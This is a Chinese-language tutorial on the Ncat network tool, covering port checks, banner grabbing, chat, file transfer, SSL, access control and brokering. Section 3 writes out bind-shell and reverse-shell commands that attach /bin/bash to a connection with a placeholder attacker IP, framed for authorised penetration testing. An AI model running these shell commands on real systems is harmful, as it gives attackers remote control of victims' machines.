# Ncat使用方法

> Ncat 通常与 Nmap 一起分发，所以如果你安装了 Nmap，你就已经有了 Ncat。

Ncat 的工作模式主要有两种：

1. **服务端 (监听模式)**：Ncat 在一个指定的端口上“监听”，等待客户端的连接。
2. **客户端 (连接模式)**：Ncat 主动去连接一个正在监听的服务端。

一旦连接建立，两端就可以像聊天一样相互发送和接收数据。

## 								基本语法

```bash
ncat [选项] [主机名/IP地址] [端口号]
```

### 1. 基础用法

1.1 端口扫描 (检查端口是否开放)

这是最简单的用法之一，用于快速检查目标主机的某个端口是否开放。

- `-v` (verbose): 显示详细输出。
- `-z` (zero-I/O): 连接后立即关闭，不进行数据交换，主要用于扫描。
- `-w <秒数>`: 设置超时时间。

**示例：** 检查 `scanme.nmap.org` 的 80 端口是否开放，超时时间为 3 秒。

```bash
ncat -v -z -w 3 scanme.nmap.org 80
```

输出可能如下： `Ncat: Connected to 45.33.32.156:80.` `Ncat: 0 bytes sent, 0 bytes received in 0.12 seconds.`

#### 1.2 Banner抓取 (获取服务信息)

连接到一个服务端口，并读取该服务返回的欢迎信息（Banner），这有助于识别服务类型和版本。

**示例：** 获取 `scanme.nmap.org` 80 端口的 HTTP 服务信息。

```bash
ncat -v scanme.nmap.org 80

# 或者使用管道发送一个HTTP请求

echo "GET / HTTP/1.0" | ncat scanme.nmap.org 80
```

#### 1.3 建立简单的聊天服务器

这是 Ncat 的经典用法，可以在两台机器之间建立一个临时的文本聊天通道。

**场景：**

- 机器A (服务端/监听方)，IP: `192.168.1.10`
- 机器B (客户端/连接方)

**步骤：**

1. **在机器A上启动监听：**

   - `-l` 或 `--listen`: 启动监听模式。
   - `-p <端口>`: 指定监听的端口号（可选，如果省略，则在命令末尾指定）。

   ```bash
   # 在 1234 端口上监听
   
   ncat -l -p 1234 -v
   
   # 或者
   
   ncat -l 1234 -v
   ```

   终端会显示 `Ncat: Listening on :::1234` 或 `Ncat: Listening on 0.0.0.0:1234`，表示正在等待连接。

2. **在机器B上连接到机器A：**

   ```bash
   ncat -v 192.168.1.10 1234
   ```

连接成功后，你在任何一边的终端输入文字并按回车，另一边的终端就会显示这些文字。按 `Ctrl+C` 可以断开连接。

### 2. 文件传输

利用输入/输出重定向，Ncat 可以非常方便地传输文件。

**场景：**

- 从机器A (发送方) 发送 `file.txt` 到机器B (接收方)。
- 机器A IP: `192.168.1.10`
- 机器B IP: `192.168.1.20`

**步骤：**

1. **在机器B (接收方) 上准备接收文件：** 启动监听，并将接收到的数据重定向 (`>`) 到一个新文件中。

   ```bash
   # 监听 1234 端口，并将收到的数据保存为 received_file.txt
   
   ncat -l 1234 > received_file.txt
   ```

2. **在机器A (发送方) 上发送文件：** 连接到机器B，并使用输入重定向 (`<`) 将文件内容发送出去。

   ```bash
   # 连接到机器B的1234端口，并将 file.txt 的内容发送过去
   
   ncat 192.168.1.20 1234 < file.txt
   ```

文件传输完成后，连接会自动断开。

### 3. 远程Shell (非常强大，请谨慎使用)

Ncat 可以用来获取目标机器的远程命令行访问权限。这在渗透测试和系统管理中非常有用。

> **⚠️ 警告：** 远程Shell功能非常强大，可能被用于恶意攻击。请确保你只在拥有明确授权的系统上使用此功能。

#### 3.1 绑定Shell (Bind Shell)

**工作方式：** 在目标机器上监听一个端口，并将 Shell (如 `/bin/bash`) "绑定"到这个端口。攻击者从自己的机器连接到目标机器的这个端口，从而获得 Shell。

**步骤：**

1. **在目标机器上执行：**

   - `-e <程序>` 或 `--exec <程序>`: 当有连接建立时，执行指定的程序。

   ```bash
   # 监听 4444 端口，并将 /bin/bash 绑定到该端口
   
   ncat -l -p 4444 -e /bin/bash
   ```

2. **在攻击者机器上执行：** 连接到目标机器的 4444 端口。

   ```bash
   ncat [目标机器IP] 4444
   ```

连接成功后，你将获得目标机器的一个交互式 Shell。

#### 3.2 反向Shell (Reverse Shell)

**工作方式：** 攻击者在自己的机器上监听一个端口。目标机器主动连接到攻击者的机器，并将自己的 Shell "送"过来。这种方式通常用于绕过防火墙，因为出站连接通常比入站连接限制更少。

**步骤：**

1. **在攻击者机器上执行：** 监听一个端口，等待目标机器连接。

   ```bash
   # 在 4444 端口上监听
   
   ncat -l -p 4444 -v
   ```

2. **在目标机器上执行：** 主动连接到攻击者的机器，并把 Shell 发送过去。

   ```bash
   # 连接到攻击者的IP和端口，并执行 /bin/bash
   
   ncat [攻击者IP] 4444 -e /bin/bash
   ```

连接成功后，攻击者机器的监听终端就会变成目标机器的 Shell。

### 4. Ncat 的高级功能

这些是 Ncat 相较于传统 Netcat 的优势所在。

#### 4.1 SSL/TLS 加密通信

使用 `--ssl` 选项可以加密所有传输的数据，防止被窃听。

**示例：** 建立一个加密的聊天服务器。

1. **服务端：**

   ```bash
   # 启动一个加密的监听服务
   
   ncat --ssl -l 1234
   ```

2. **客户端：**

   ```bash
   # 连接到加密的服务
   
   ncat --ssl [服务端IP] 1234
   ```

   现在两端之间的所有通信都是加密的。这对于文件传输和远程Shell同样适用。

#### 4.2 访问控制

可以限制哪些 IP 地址可以连接到你的监听服务。

- `--allow <IP/范围>`: 只允许指定的 IP 连接。
- `--deny <IP/范围>`: 禁止指定的 IP 连接。

**示例：** 只允许来自 `192.168.1.100` 的连接。

```bash
ncat -l 1234 --allow 192.168.1.100
```

#### 4.3 连接代理/中继 (Connection Brokering)

Ncat 可以作为一个简单的代理服务器，将多个客户端连接到同一个服务端。

- `-k` 或 `--keep-open`: 在当前连接结束后，继续监听等待下一个连接。
- `--broker`: 启动代理模式。

**示例：** 创建一个简单的聊天室。

1. **启动代理服务器：**

   ```bash
   ncat -l 1234 --broker -k -v
   ```

2. **多个客户端连接：** 每个客户端都连接到这个代理服务器。

   ```bash
   # 客户端A
   
   ncat [服务器IP] 1234
   
   
   
   # 客户端B
   
   ncat [服务器IP] 1234
   ```

   现在，任何一个客户端发送的消息都会被广播给所有其他连接的客户端。

### 常用选项速查表

| 选项        | 长选项                 | 描述                                   |
| :---------- | :--------------------- | :------------------------------------- |
| `-l`        | `--listen`             | 启动监听（服务端）模式                 |
| `-p <端口>` | `--source-port <端口>` | 指定监听或源端口                       |
| `-v`        | `--verbose`            | 显示详细的调试信息                     |
| `-z`        |                        | 零I/O模式，用于端口扫描                |
| `-w <秒>`   | `--wait <秒>`          | 连接超时时间                           |
| `-k`        | `--keep-open`          | 保持监听，允许多个连接（需与`-l`合用） |
| `-e <命令>` | `--exec <命令>`        | 执行一个程序来处理连接（危险！）       |
| `-c <命令>` | `--sh-exec <命令>`     | 通过`/bin/sh -c`执行命令               |
|             | `--ssl`                | 使用 SSL/TLS 加密通信                  |
|             | `--allow <IP>`         | 允许指定的 IP 地址连接                 |
|             | `--deny <IP>`          | 拒绝指定的 IP 地址连接                 |
|             | `--broker`             | 启动连接代理模式                       |

### 总结

Ncat 是一个极其强大的瑞士军刀式网络工具。无论是简单的端口检查、文件传输，还是复杂的加密远程控制，它都能胜任。掌握 Ncat 的用法，将极大地提升你在网络诊断、系统管理和安全测试方面的效率。务必记住，在执行远程Shell等高危操作时，要遵守法律法规并获得充分授权。